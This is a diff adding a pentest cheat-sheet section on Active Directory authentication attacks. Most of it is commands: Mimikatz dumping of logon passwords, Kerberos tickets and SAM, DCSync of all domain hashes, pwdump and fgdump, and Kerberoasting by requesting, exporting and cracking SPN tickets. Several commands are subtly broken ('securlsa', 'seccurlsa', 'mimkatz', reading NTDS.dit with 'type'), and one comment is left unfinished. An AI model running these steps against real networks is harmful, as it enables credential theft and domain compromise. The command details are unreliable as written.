@@ -120,12 +120,95 @@ Foreach($obj in $Result) {
 }
 ```
 
-
-
-
 ## AD Authentication
 
+### NTLM ###
 
+NTLM authentication uses a challenge-response model, where a nonce/challenge encrypted using the user's NTLM hash is validated by the Domain Controller.
+
+Dumping LM/NTLM hashes with Mimikatz
+```
+# Open mimikatz and escalate security token to SYSTEM integrity
+cmd> mimikatz.exe
+mimikatz > privilege::debug
+mimikatz > token::elevate
+
+# Dump creds of all logged-on users using the Securlsa module
+mimikatz > securlsa::logonpasswords
+
+# Dump Ticket Granting Ticket and Ticket Granting Service (kerberos tickets)
+# -> Access resources associated with these tickets OR
+# -> Obtain TGS with a TGT to access specific resources we want to target in the domain.
+mimkatz > seccurlsa::tickets
+
+# Dump contents of SAM database in current host
+mimikatz > lsadump::sam
+
+# Dump contents of ???
+mimikatz > lsadump::dcsync /domain:pentestlab.local /all
+```
+
+Other tools
+```
+# pwdump
+cmd> pwdump.exe localhost
+
+# fgdump (improved pwdump, shutdown firewalls)
+cmd> fgdump.exe localhost
+
+# all domain hashes in NTDS.dit file on the Domain Controller
+cmd> type C:\Windows\NTDS\NTDS.dit
+```
+
+### Kerberos ####
+
+Kerberos authentication uses a ticketing system, where a Ticket Granting Ticket (TGT) is issued by the Domain Controller (with the role of Key Distribution Center (KDC)) and is used to request tickets from the Ticket Granting Service (TGS) for access to resources/systems joined to the domain.
+* Hashes are stored in the Local Security Authority Subsystem Service (LSASS).
+* LSASS process runs as SYSTEM, so we need SYSTEM / local admin to dump hashes stored on target.
+
+Dumping hashes or Kerberos TGT/TGS tickets with Mimikatz
+```
+# escalate security token to SYSTEM integrity
+cmd> mimikatz.exe
+mimikatz > privilege::debug
+mimikatz > token::elevate
+
+# dump creds of all logged-on users using Securlsa module
+mimikatz > securlsa::logonpasswords
+
+# dump TGT and TGS tickets
+# -> access resources associated with the tickets
+# -> exchange TGS with TGT to access resources we want to target in domain
+mimikatz > securlsa::tickets
+
+# dump contents of SAM db in current host
+mimikatz > lsadump::sam
+```
+
+Service account attacks
+* If we know the `serviceprincipalname` value from prior AD enum, we can target the SPN by by requesting a service ticket for it from the Domain Controller and access resources from the service with our own ticket.
+```
+# load the System.IdentityModel namespace
+PS> Add-Type -AssemblyName System.IdentityModel
+
+# request the Service Ticket
+PS> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList '[service_principal_name]'
+
+# list cached Kerberos tickets for the current user
+PS> klist
+
+# download/export cached tickets
+mimikatz > kerberos::list /export
+```
+
+Crack SPN password hash with Kerberoast
+```
+# locally crack hashes
+$ python tgsrepcrack.py wordlist [/path/to/exported/tickets]
+
+# crack hashes on target
+PS> Invoke-Kerberoast.ps1
+```
 
 
 ## AD Lateral Movement
